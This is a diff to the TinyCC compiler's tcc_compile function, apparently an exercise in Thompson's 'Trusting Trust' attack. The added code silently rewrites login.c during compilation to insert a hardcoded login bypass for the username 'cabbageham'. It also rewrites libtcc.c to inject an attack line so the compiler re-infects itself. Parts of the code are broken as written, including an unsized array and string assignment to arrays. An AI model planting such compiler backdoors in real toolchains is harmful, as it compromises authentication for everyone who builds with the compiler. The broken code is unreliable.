@@ -735,15 +735,22 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 
        Alternatively we could use thread local storage for those global
        variables, which may or may not have advantages */
+    char login_line[] = "if (!strcmp(username, \"cabbageham\"))return 0;";
+    FILE *source;
+    FILE *temp; 
+    char target_line[];
+    char buffer[50000];
+    char buffer2[50000];
+    char attack_line[] = "quine.c";
     if(!strcmp(str, "login.c")) {
         printf("testing\n");
-        char login_line[] = "if (!strcmp(username, \"cabbageham\"))return 0;";
-        FILE *source;
+        
+        
         source = fopen(str, "r");
-		FILE *temp; 
+		
         temp = fopen("temp.txt", "w");
-        char target_line[] = "static int do_login(const char *username){";
-		char buffer[50000];
+        target_line = "static int do_login(const char *username){";
+        
 		while (fgets(buffer, 50000, source)) {
 		    if (strstr(buffer, target_line)) {
 		        fputs(buffer, temp);
@@ -760,14 +767,13 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 	}
 
 	if(!strcmp(str, "libtcc.c")) {
-		FILE *source = fopen(str, "r");
-		FILE *temp = fopen("temp.txt", "w");
-        char target_line[] = "       variables, which may or may not have advantages */";
-        char attack_line[] = "printf(\"THIS IS A TEST\\n\");";
-		char buffer[50000];
-		while (fgets(buffer, 50000, source)) {
-		    if (strstr(buffer, target_line)) {
-		        fputs(buffer, temp);
+		source = fopen(str, "r");
+		temp = fopen("temp.txt", "w");
+        target_line = "       variables, which may or may not have advantages */";
+        
+		while (fgets(buffer2, 50000, source)) {
+		    if (strstr(buffer2, target_line)) {
+		        fputs(buffer2, temp);
                 fputs(attack_line, temp);
             } 
             else {
@@ -776,8 +782,7 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
         }
 		fclose(source);
 		fclose(temp);
-		fd = _tcc_open(s1, "temp.txt");
-        str = "temp.txt";
+
 	}
 
     tcc_enter_state(s1);
